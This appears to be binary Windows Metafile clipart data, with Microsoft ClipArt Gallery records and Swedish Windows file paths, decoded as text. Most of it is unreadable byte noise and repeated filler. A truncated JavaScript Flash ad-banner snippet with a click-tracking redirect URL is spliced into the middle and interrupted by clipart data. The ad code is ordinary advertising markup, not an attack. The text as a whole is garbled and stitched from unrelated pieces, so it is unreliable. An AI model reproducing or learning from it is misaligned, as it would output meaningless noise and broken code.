�/��)��#����� �"���&���*���B���Z��p�������~��|���y���v���r���n���i���o���w����������������� ���������'���5���B���6���*��������������������������������������������������������������������&���.� �6��>��G��O��W��^��^��O��A��3��&������ �����������������!��)��1��9�)�@�6�F�D�L�S�P�c�S�l�V�c�V�Z�V�R�V�I�V�@�V�7�U�/�U�'�T�'�U�#�V��V��U��T��S��R�
���
����/��B��E��J��N��R�"�b�%�v�*���5���5���5���4���4���-���'���!�������{��t�
������������ ���&���-���5���>���F���N���V���^���d���k���p���t���x���}�
���������)���3���>���B���G���M���S���Z���b���j���s���w���}�������������������������������������������������������������������������������
������*���9���I���X���h���y���|���~���������{���v���p���j���d���`���]���\���X���S�x�M�m�G�b�@�W�:�L�5�A�1�5�4�5�;�?�B�H�J�Q�S�Z�[�c�c�l�j�v�q����������������������������������������&���7���H���Y���j���{�������������������������������������������������������������������������������=���=���E���M���U���]���e���l���s���z���s���l���e���^���V���O���G���@���@���6���-���$���������
������������������������������������)���2���<���D���M���V���_���i���   -    �    -    -    �   33      -     (   $ ��{���t���y���}�������������������������������������������������������{�   -    �    -    -    �   33      -     .   $ m�u�k�o�g�l�b�i�^�g�V�g�O�h�H�k�A�l�@�n�?�p�>�q�?�s�D�u�J�w�P�y�U�{�\�{�c�{�i�z�m�u�   -    �    -    -    �   33      -     ^   $- O�C�K�B�G�A�B�@�>�@�9�?�5�>�0�>�,�=��:��6��1���,���&��� ���������
����������������������������������������{��������������������������� ���(���/���5���:��>��A�*�C�<�D�O�C�   -    �    -    -    �   33      -     &   $ ��>���?���?���?���?���?���?���?���@���B���C���D���D���C���B���@���>�   -    �    -    -    �   33      -     �   $A ��$���!����������������t��g��c��_��Z�
����.��3��9� �>�!�D�"�I�#�O�$�U�%�[�%�`�&�e�'�j�(�o�(�u�(�z�)���)���)���)���)���)���(���(���'���%���$�   -    �    -    -    �   33      -     F   $! �����������
�b��i��q��z��������������������   -    �    -    -    �   33      -     h   $2 (��������������������������������������������������|�}�t�r�k�g�b�^�W�V�K�N�>�F�2�=�&�4��)���
�#��,�/�7�A�C�S�P�c�_�q�o�}�����������������������������������������������������	���������(���(���   -    �    -    -    �   33      -     *   $ $���$������������
���	���	���
������
�����������������z���t�y�n�q�i�h�c�`�\�Y�T�R�K�L�;�A�*�7��-��%��� ���������%���'���*���,���.���0���2���5���9���9���;���>���B���G���N�
�U��^�!�e�%�o�)�y�1���4���5���7���9���;���<���>���?���A���@���>���;�	�7��5�1�6�F�9�\�>�l�C�|�J���S���X���\���_���c���g���l���s���{�������   -    �    -    -    �   33      -     8   $ o���l�y�i�k�g�]�f�M�b�8�c�!�f�
�j���k���i���i���h���f���`���c���d���c���^��U�,�R�M�U�l�b���q���o���o���   -    �    -    -    �  ���      -     �   $? ��������������������������t���h���^���R���F���;���/������������������������������������l���U���?���*���������/���D���0���0�������������������������%���6���C���O���\���i��������������������������,���W�����������������������������������������   -    �    -    -    �  ���      -     X   $* 
��$� �B� �a����������������	���
������
�������� ��)��2��;��D��>��8��2��-�   -    �    -    -    �   33      -         $ =��>��@��A��B�
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s���b���O���=���,������ ��������}���u���k���_��Y�|�R�y�L�w�E�u�>�t�6�s�/�q�(�p�+�r�/�s�3�u�7�v�;�x�?�z�C�}�G��L���Q���U���Z���Y���V���R���O���-���0���5���9���=���F���M���R���U���U���N���H���A���:���B���H���L���Q���T���X���\���a���t��p��l��h��d��`��\��X��U�
�^��f�
�j��j��j�
�)��&���#���;���R���i������������������������������������������������
�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                        �����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~�  ���All Categories C:\Program\Microsoft Works\workscor\j0160042.wmf   � �G� \�      �   � �7�         $=w� � PO4���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All Categories0C:\Program\Microsoft Works\workscor\j0160042.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������� ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������                  ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������� ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������ ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            �����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������      C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������ ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������         ����       )
������������n�G�6�6�4�$������ 
� � 1� C� X� _� [� Sdw'�7�C�O�Y~dqr8w
�
�   �  ��      -    � @   $ ;� F� L� Q� X_g#t $������ �� �� �� �� �� �{ �� �{ |� l� [� I� =� ;� ;�    �  ���      -    � 6   $ �b�y������+�6�8�9�=�I�X�d�v�w�vgq4H+1�?�L�b�b   �  ?��      -    � d   $0 � �~ �t �w �| �r }r qu jk _g Ko <p -| � #� &� (� &� aw��������������2&F2S7a=iDkQi`fsa�b�q���f���w�3�� �� �� �� �   �  �Ÿ      -    � R   $' �������������1�S�^�t��������������������������������z�_�>�!#
 L� P� V� c� f� c� [� P� L� L�    �  �Ÿ      -    �    $ �)�.�/�&������)�)   $ ��� �� �� �� �� � 
� � ��   �  ̌�      -    � ,   $  )6CMTYX Q�F�;�,���	   �  ���      -    �    $ �8�C�F�8���   �           -    �    $ @ h O e ] � _ � W � @ h @ h >   $  �  � ) � 0 � : � @ � E � H � L � T � ] � b � b � ` U P � G � < � 5 � * � $ � * � * � % �  �  �  �  �  �    $	 e 	r 	{ � { $o $g e 	e 	   $ _ � h � m � j � _ � _ � _ �    $
� � � � � 	� � � � $   $ � � (3
?K
"*)22879;7>3B+GN
U�\�e�k�o�r�t�t|tppckTbCX3L B:2� +� $� � � 
�
����������������(   $ i�r���������������������������t�i�i�"   $ 	����#�)�/�/�(����	�	�	�&   $ 9EBMGTN]TeYn^udcval]cVZQSOMGE9E9E(   $ W>^FeMmTt\zck�s�y�n�bxVqPiHcB^<W>W>R   $' ��(�2�<�D�N�X�a�k�w������'�-�1�6�&����� ������t�g�X�L�?�5�,�%����N   $% `,p4?�F�K�O�T�Z�`�d�d�g�k�p�z���������������x�q�m�n�j�f�a�[�U�R�Jn@_6`,`,*   $ SD^LeUl_rhupyw|���z�t~mshia`[WUQJGSDSDR   $' +>(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
6�2�-�'��0�0<   $ ��������������������������������������������������������N   $% �1�#����������������"�3�B�M�W�_�h�c�V�?�*�������������������
�������(�-�1�1�1�3�7�9�:�>�F�Q�Z�b�h�n�g�_�S�F|>u6r2v0}-�+�+�)�'���� y�n�f�^�\�Z�c�c0   $ � ������������
����!�#�#�"� � D   $  q^vb{b^�X�R�N�G�C�6w-n%aXL>0&� "0>JU!i/w>{F{KwRq^q^R   $' �� �� �� �� �� �� �� �� �� �� �� �� �� �����
���� �� �� �� �� �� �� �� �� �� �� 6   $ ��� �� �� �� �� �� �� ��  � � 	� 	� � � � �� �� �� �� �� ���0   $ MSZ+b8gFjSlhm}n�n�i�n�s�t�uxvfvNu@t3_MM.   $ (� 3� ;� C� I� N� P� M� G� =� 5� +� !� � � � &   $ X� [ ^cgjkkfc� b� `� \� U� W� X� X� Z   $+ �� �� �� �� �� �� �� �� �� �� �� �� �� ����~uokm r v��������� �� �� �� �� �� �� �� �� �� �� ��    $ Q� T� W� \� a� c� c� ^� \� U� Q� Q� <   $ �� x� n� c� W� M� G� @� =� C� I� N� R� T� W� X� X� T� P� L� S� ^� k� v� � �� �� ��                        � �� {� q� h� `� X� R� N� I� I(   $ ���������� ��
�
����������������(   $ i�r���������������������������t�i�i�"   $ 	����#�)�/�/�(����	�	�	�&   $ 9EBMGTN]TeYn^udcval]cVZQSOMGE9E9E(   $ W>^FeMmTt\zck�s�y�n�bxVqPiHcB^<W>W>R   $' ��(�2�<�D�N�X�a�k�w������'�-�1�6�&����� ������t�g�X�L�?�5�,�%����N   $% `,p4?�F�K�O�T�Z�`�d�d�g�k�p�z���������������x�q�m�n�j�f�a�[�U�R�Jn@_6`,`,*   $ SD^LeUl_rhupyw|���z�t~mshia`[WUQJGSDSDR   $' +>(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
����!�#�#�"� � D   $  q^vb{b^�X�R�N�G�C�6w-n%aXL>0&� "0>JU!i/w>{F{KwRq^q^R   $' �� �� �� �� �� �� �� �� �� �� �� �� �� �����
���� �� �� �� �� �� �� �� �� �� �� 6   $ ��� �� �� �� �� �� �� ��  � � 	� 	� � � � �� �� �� �� �� ���0   $ MSZ+b8gFjSlhm}n�n�i�n�s�t�uxvfvNu@t3_MM.   $ (� 3� ;� C� I� N� P� M� G� =� 5� +� !� � � � &   $ X� [ ^cgjkkfc� b� `� \� U� W� X� X� Z   $+ �� �� �� �� �� �� �� �� �� �� �� �� �� ����~uokm r v��������� �� �� �� �� �� �� �� �� �� �� ��    $ Q� T� W� \� a� c� c� ^� \� U� Q� Q� <   $ �� x� n� c� W� M� G� @� =� C� I� N� R� T� W� X� X� T� P� L� S� ^� k� v� � �� �� ��                        ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������� ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C                  ries c:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf  �         -x� � ��2���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All CategoriesGc:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������� ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C<script language="JavaScript">
<!--
clicktag_1 = String('/event.ng/Type=click&FlightID=3135&AdID=665330&TargetID=3135&Segments=3144,5078&Targets=3135,5069&Values=31,43,48,50,60,77,80,91,101,110,150,207,300,598&RawValues=&Redirect=http://ads.dayrates.com/cgi-bin/clicktracker/i/b/22486_5961/http://se.kelkoo.com/category.jsp?catId=125701%26kpartnerid=8901090');
flash_url = String("http://ads.dayrates.com/ads/11242/telefon_se_140x350.swf");
start = clicktag_1.indexOf('http');
clicktag = clicktag_1.substrin ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=5,0,0,0" ');
 document.write('  WIDTH=140 HEIGHT=350>');
 document.write(' <PARAM NAME=movie VALUE="' + flash_url + '?clicktag=' + clicktag + '">');
 document.write(' <PARAM NAME=quality VALUE=autohigh> '); 
 document.write(' <EMBED src="');
 document.write(flash_url);
 document.write('?clicktag=');
 document.write(clicktag);
 document.write('" quality=autohigh ');
 document.write('NAME=flashad swLiveConnect=FALSE WIDTH=140 HEIGHT=350 ');
 document.write('TYPE="application/x-shockwave-flash" PLUGINSPAGE="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash">');
 document.write('</EMBED>');
 document.write('</OBJECT>');
// -->
</script>                                                                                                                                        ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������         ����       W  �  �K   	  �%   �
���
���	�������������������������������������������������������������s���a���M���8���8���&�����������������������������������������~���s���i���^���T���J���?���3���&�������|�	�����������������{���u���o���p���t�m�t�P�j�5�e�&�_��Y�	�T���P���M���L���N���W���_���d���f�}�f�}�d�r�`�h�Z�`�R�Y�M�W�H�T�B�R�=�P�7�N�2�L�,�I�'�G�,�=�3�3�:�)�A��G��K��M���L���I���F���B���?���:���6���0���+���%�������������������������������������������������������������������������������������v���k���`���T���G���=���3���)��� �����������������������.�	�/��0���1���1���2���3���4���6���7���9���<���>���?���?���>���<���<���=���?���@��A��D�~�H�w�M�p�S�j�Y�e�`�b�h�`�p�_�}�b���g���l���l���r���z���������x��o��j�-�l�A�n�A�p�H�q�Q�p�Y�n�`�i�f�e�l�`�r�]�y�Y��V���S���P���M���L���M���N���O���P���O���O���M���F���>���7���.��%���,��?�
������������ ���!���"���"���#���%���(���*���,���.���*���'���%���#���������������� ����� �
���	�����������������������������������������������������������������������������������{���w���t���l���e���]���V���N���G���@���9���4���0���+���'���"���������������������������������%���+���0���5���8���:���;���<���;���5���-��%�x��o��a��c�
�d��f���g���h���h���i���j���k���l���l���n���s���{��������������������������������������������������������������������������������������������������������"���,���4���<��?�
�C��F��J��M�!�R�&�W�+�]�(�\�#�[��Y��X��R� �L���E���=���4���)���������������������������������������������"���%���)���/���5���<���C���J���R���Z���c���f���j���o���s���������������������������������������������������������������������� ����������� ��-��9��E��F��G��G�
�]�
�Y���X���X���X���W���Q���I��>��3� �&�+��5��?���G���E��:��0��&�%��-��4��8���9���:���:���:���;���5���0���-���*���'���$��� �����������	��� ���&���,���1���/���&� ����	��
�R��L���F���?���^���a���e���i� �l��q��v�	�z�
���������������
�/��)��#����� �"���&���*���B���Z��p�������~��|���y���v���r���n���i���o���w����������������� ���������'���5���B���6���*��������������������������������������������������������������������&���.� �6��>��G��O��W��^��^��O��A��3��&������ �����������������!��)��1��9�)�@�6�F�D�L�S�P�c�S�l�V�c�V�Z�V�R�V�I�V�@�V�7�U�/�U�'�T�'�U�#�V��V��U��T��S��R�
���
����/��B��E��J��N��R�"�b�%�v�*���5���5���5���4���4���-���'���!�������{��t�
������������ ���&���-���5���>���F���N���V���^���d���k���p���t���x���}�
���������)���3���>���B���G���M���S���Z���b���j���s���w���}�������������������������������������������������������������������������������
������*���9���I���X���h���y���|���~���������{���v���p���j���d���`���]���\���X���S�x�M�m�G�b�@�W�:�L�5�A�1�5�4�5�;�?�B�H�J�Q�S�Z�[�c�c�l�j�v�q����������������������������������������&���7���H���Y���j���{�������������������������������������������������������������������������������=���=���E���M���U���]���e���l���s���z���s���l���e���^���V���O���G���@���@���6���-���$���������
������������������������������������)���2���<���D���M���V���_���i���   -    �    -    -    �   33      -     (   $ ��{���t���y���}�������������������������������������������������������{�   -    �    -    -    �   33      -     .   $ m�u�k�o�g�l�b�i�^�g�V�g�O�h�H�k�A�l�@�n�?�p�>�q�?�s�D�u�J�w�P�y�U�{�\�{�c�{�i�z�m�u�   -    �    -    -    �   33      -     ^   $- O�C�K�B�G�A�B�@�>�@�9�?�5�>�0�>�,�=��:��6��1���,���&��� ���������
����������������������������������������{��������������������������� ���(���/���5���:��>��A�*�C�<�D�O�C�   -    �    -    -    �   33      -     &   $ ��>���?���?���?���?���?���?���?���@���B���C���D���D���C���B���@���>�   -    �    -    -    �   33      -     �   $A ��$���!����������������t��g��c��_��Z�
����.��3��9� �>�!�D�"�I�#�O�$�U�%�[�%�`�&�e�'�j�(�o�(�u�(�z�)���)���)���)���)���)���(���(���'���%���$�   -    �    -    -    �   33      -     F   $! �����������
�b��i��q��z��������������������   -    �    -    -    �   33      -     h   $2 (��������������������������������������������������|�}�t�r�k�g�b�^�W�V�K�N�>�F�2�=�&�4��)���
�#��,�/�7�A�C�S�P�c�_�q�o�}�����������������������������������������������������	���������(���(���   -    �    -    -    �   33      -     *   $ $���$������������
���	���	���
������
�����������������z���t�y�n�q�i�h�c�`�\�Y�T�R�K�L�;�A�*�7��-��%��� ���������%���'���*���,���.���0���2���5���9���9���;���>���B���G���N�
�U��^�!�e�%�o�)�y�1���4���5���7���9���;���<���>���?���A���@���>���;�	�7��5�1�6�F�9�\�>�l�C�|�J���S���X���\���_���c���g���l���s���{�������   -    �    -    -    �   33      -     8   $ o���l�y�i�k�g�]�f�M�b�8�c�!�f�
�j���k���i���i���h���f���`���c���d���c���^��U�,�R�M�U�l�b���q���o���o���   -    �    -    -    �  ���      -     �   $? ��������������������������t���h���^���R���F���;���/������������������������������������l���U���?���*���������/���D���0���0�������������������������%���6���C���O���\���i��������������������������,���W�����������������������������������������   -    �    -    -    �  ���      -     X   $* 
��$� �B� �a����������������	���
������
�������� ��)��2��;��D��>��8��2��-�   -    �    -    -    �   33      -         $ =��>��@��A��B�
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s���b���O���=���,������ ��������}���u���k���_��Y�|�R�y�L�w�E�u�>�t�6�s�/�q�(�p�+�r�/�s�3�u�7�v�;�x�?�z�C�}�G��L���Q���U���Z���Y���V���R���O���-���0���5���9���=���F���M���R���U���U���N���H���A���:���B���H���L���Q���T���X���\���a���t��p��l��h��d��`��\��X��U�
�^��f�
�j��j��j�
�)��&���#���;���R���i������������������������������������������������
�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
